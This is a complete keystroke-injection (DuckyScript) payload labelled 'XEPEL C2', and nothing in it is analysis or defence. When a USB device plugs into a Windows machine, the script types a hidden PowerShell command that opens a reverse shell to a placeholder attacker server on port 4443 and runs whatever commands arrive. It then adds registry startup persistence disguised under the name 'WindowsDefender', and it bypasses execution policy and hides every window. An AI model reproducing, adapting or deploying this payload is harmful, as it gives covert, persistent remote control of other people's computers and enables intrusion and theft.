REM XEPEL C2 – Fully Hidden Reverse Shell
REM Uses cmd.exe to launch hidden PowerShell
REM No visible window at all

DELAY 2000

REM Open Run dialog
GUI r
DELAY 1000

REM Launch cmd hidden which launches hidden powershell
STRING cmd /c start /min "" powershell -w hidden -ep bypass -nop -c "& {$c=New-Object Net.Sockets.TCPClient('YOUR_VPS_IP',4443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$rb=([text.encoding]::ASCII).GetBytes($r+'PS '+(pwd).Path+'> ');$s.Write($rb,0,$rb.Length);$s.Flush()}}"
ENTER
DELAY 1000

REM Wait for connection then add persistence
DELAY 3000

REM Add persistence via registry
GUI r
DELAY 1000
STRING cmd /c start /min "" powershell -w hidden -ep bypass -nop -c "Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsDefender' -Value 'cmd /c start /min powershell -w hidden -ep bypass -nop -c ""& {$c=New-Object Net.Sockets.TCPClient(''YOUR_VPS_IP'',4443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$rb=([text.encoding]::ASCII).GetBytes($r+''PS ''+(pwd).Path+''> '');$s.Write($rb,0,$rb.Length);$s.Flush()}}""'"
ENTER
